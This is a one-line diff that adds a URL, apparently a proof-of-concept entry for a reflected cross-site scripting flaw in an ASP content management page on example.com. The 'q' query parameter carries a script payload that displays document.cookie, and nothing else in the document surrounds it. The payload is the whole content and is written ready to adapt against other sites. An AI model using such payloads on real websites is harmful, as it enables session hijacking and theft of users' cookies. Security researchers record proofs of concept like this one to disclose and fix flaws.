@@ -1,0 +1,1 @@
+http://www.example.com/saspcms/default.asp?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
